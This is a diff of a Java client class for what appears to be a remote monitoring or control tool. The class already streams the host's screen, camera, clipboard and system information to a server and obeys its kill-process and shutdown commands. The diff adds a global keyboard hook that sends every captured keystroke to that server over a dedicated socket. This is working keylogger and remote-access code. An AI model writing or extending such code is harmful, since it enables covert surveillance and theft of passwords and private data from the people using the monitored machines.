@@ -2,6 +2,8 @@ package client;
 
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.ObjectMapper;
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
 import core.*;
 import core.model.Action;
 import core.model.StringMat;
@@ -24,10 +26,13 @@ import java.util.concurrent.TimeUnit;
 public class ClientSession extends Session {
     private Thread threadSystemInfo;
     private String id;
-    ClipboardListener clipboardListener;
+    private ClipboardListener clipboardListener;
+    private KeyboardListener keyboardListener;
+    private ObjectMapper mapper;
 
     public ClientSession(Socket skConnect) throws IOException {
         super(skConnect);
+        mapper = new ObjectMapper();
         Core.writeString(writerConnect, UtilContent.client);
         //send name PC
         oshi.SystemInfo si = new oshi.SystemInfo();
@@ -35,13 +40,19 @@ public class ClientSession extends Session {
         Core.writeString(writerConnect, hostName);
         //Nhận id từ server
         id = readerConnect.readLine();
+        //Dang ky lang nghe key
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            e.printStackTrace();
+        }
     }
 
     public void createConnectSystemInfo() throws IOException {
         skSystemInfo = new Socket(UtilContent.address, UtilContent.port);
         createBufferedSystemInfo();
         Action action = new Action(UtilContent.createConnectSystemInfo, id);
-        String stringAction = new ObjectMapper().writeValueAsString(action);
+        String stringAction = mapper.writeValueAsString(action);
         Core.writeString(writerSystemInfo, stringAction);
         sendSystemInfo(writerSystemInfo, readerSystemInfo);
     }
@@ -50,7 +61,7 @@ public class ClientSession extends Session {
         skCamera = new Socket(UtilContent.address, UtilContent.port);
         createBufferedCamera();
         Action action = new Action(UtilContent.createConnectCamera, id);
-        String stringAction = new ObjectMapper().writeValueAsString(action);
+        String stringAction = mapper.writeValueAsString(action);
         Core.writeString(writerCamera, stringAction);
     }
 
@@ -58,7 +69,7 @@ public class ClientSession extends Session {
         skScreens = new Socket(UtilContent.address, UtilContent.port);
         createBufferedScreens();
         Action action = new Action(UtilContent.createConnectScreens, id);
-        String stringAction = new ObjectMapper().writeValueAsString(action);
+        String stringAction = mapper.writeValueAsString(action);
         Core.writeString(writerScreens, stringAction);
     }
 
@@ -66,8 +77,16 @@ public class ClientSession extends Session {
         skClipboard = new Socket(UtilContent.address, UtilContent.port);
         createBufferedClipboard();
         Action action = new Action(UtilContent.createConnectClipboard, id);
-        String stringAction = new ObjectMapper().writeValueAsString(action);
+        String stringAction = mapper.writeValueAsString(action);
         Core.writeString(writerClipboard, stringAction);
+    }
+
+    private void createConnectKeyboard() throws IOException {
+        skKeyboard = new Socket(UtilContent.address, UtilContent.port);
+        createBufferedKeyboard();
+        Action action = new Action(UtilContent.createConnectKeyboard, id);
+        String stringAction = mapper.writeValueAsString(action);
+        Core.writeString(writerKeyboard, stringAction);
     }
 
     private void disconnect() {
@@ -111,10 +130,22 @@ public class ClientSession extends Session {
         }
     }
 
+    private void stopKeyboard() {
+        if(keyboardListener != null){
+            try {
+                keyboardListener.unregister();
+                keyboardListener = null;
+                resetKeyboard();
+                System.out.println("Stopped keyboard.");
+            } catch (NativeHookException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
     public void sendSystemInfo(BufferedWriter writer, BufferedReader reader) throws IOException {
         oshi.SystemInfo si = new oshi.SystemInfo();
         SystemInfo systemInfo = new SystemInfo(si);
-        ObjectMapper mapper = new ObjectMapper();
         threadSystemInfo = new Thread(new Runnable() {
             @Override
             public void run() {
@@ -188,7 +219,7 @@ public class ClientSession extends Session {
                             Core.paintCursor(screenshot);
                             Mat mat = Core.bufferedImageToMat(screenshot);
                             StringMat stringMat = new StringMat(mat);
-                            String dataScreens = new ObjectMapper().writeValueAsString(stringMat);
+                            String dataScreens = mapper.writeValueAsString(stringMat);
                             Core.writeString(writer, dataScreens);
 
                             TimeUnit.MICROSECONDS.sleep(10);
@@ -208,16 +239,15 @@ public class ClientSession extends Session {
     }
 
     private void clipboardListen(BufferedWriter writerClipboard) {
+        System.out.println("Clipboard start...");
         clipboardListener = new ClipboardListener(new ClipboardListener.ClipboardChange() {
             @Override
             public void onChange(Transferable transferable) {
-                ObjectMapper mapper = new ObjectMapper();
                 try {
                     String data = (String) (transferable.getTransferData(DataFlavor.stringFlavor));
                     Action action = new Action(UtilContent.sendTypeString, data);
                     String stringAction = mapper.writeValueAsString(action);
                     Core.writeString(writerClipboard, stringAction);
-                    System.out.println("Send string");
                 } catch (Exception e) {
                     try {
                         BufferedImage bufferedImage = (BufferedImage) transferable.getTransferData(DataFlavor.imageFlavor);
@@ -225,11 +255,10 @@ public class ClientSession extends Session {
                         Action action = new Action(UtilContent.sendTypeImage, data);
                         String stringAction = mapper.writeValueAsString(action);
                         Core.writeString(writerClipboard, stringAction);
-                        System.out.println("Send image");
                     } catch (UnsupportedFlavorException ex) {
                         System.out.println("Not string or image UnsupportedFlavorException");
                     } catch (IOException ex) {
-                        System.out.println("Not string or image IOException");
+                        ex.printStackTrace();
                     }
                 }
             }
@@ -240,7 +269,22 @@ public class ClientSession extends Session {
                 System.out.println("Lost clipboard");
             }
         });
+    }
 
+    private void keyboardListen(BufferedWriter writerKeyboard) {
+        System.out.println("Keyboard start...");
+        keyboardListener = new KeyboardListener(new KeyboardListener.KeyboardPress() {
+            @Override
+            public void onPress(String data) {
+                try {
+                    Core.writeString(writerKeyboard, data);
+                } catch (JsonProcessingException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
     }
 
     @Override
@@ -254,8 +298,9 @@ public class ClientSession extends Session {
                     createConnectSystemInfo();
                     System.out.println("SystemInfo running...");
                 } else if (stringAction.equals(UtilContent.reset)) {
-                    //Yêu cầu reset từ server
+                    //Yêu cầu reset từ server khi mat ket not admin hoac thay doi user tren admin
                     stopClipboard();
+                    stopKeyboard();
                     threadSystemInfo.interrupt();
                     closeSocket();
                     System.out.println("Wait...");
@@ -270,6 +315,14 @@ public class ClientSession extends Session {
                 } else if (stringAction.equals(UtilContent.stopScreens)) {
                     resetScreens();
                 } else if (stringAction.equals(UtilContent.disconnect)) {
+                    //Yêu cầu disconnect từ admin
+                    stopClipboard();
+                    stopKeyboard();
+                    try {
+                        GlobalScreen.unregisterNativeHook();
+                    } catch (NativeHookException e) {
+                        e.printStackTrace();
+                    }
                     disconnect();
                 } else if (stringAction.equals(UtilContent.shutdown)) {
                     shutdown();
@@ -278,8 +331,13 @@ public class ClientSession extends Session {
                     clipboardListen(writerClipboard);
                 } else if (stringAction.equals(UtilContent.stopClipboard)) {
                     stopClipboard();
+                } else if (stringAction.equals(UtilContent.createConnectKeyboard)) {
+                    createConnectKeyboard();
+                    keyboardListen(writerKeyboard);
+                } else if (stringAction.equals(UtilContent.stopKeyboard)) {
+                    stopKeyboard();
                 } else {
-                    Action action = new ObjectMapper().readerFor(Action.class).readValue(stringAction);
+                    Action action = mapper.readerFor(Action.class).readValue(stringAction);
                     switch (action.getAction()) {
                         case UtilContent.killProcess: {
                             killProcess((String) action.getData());
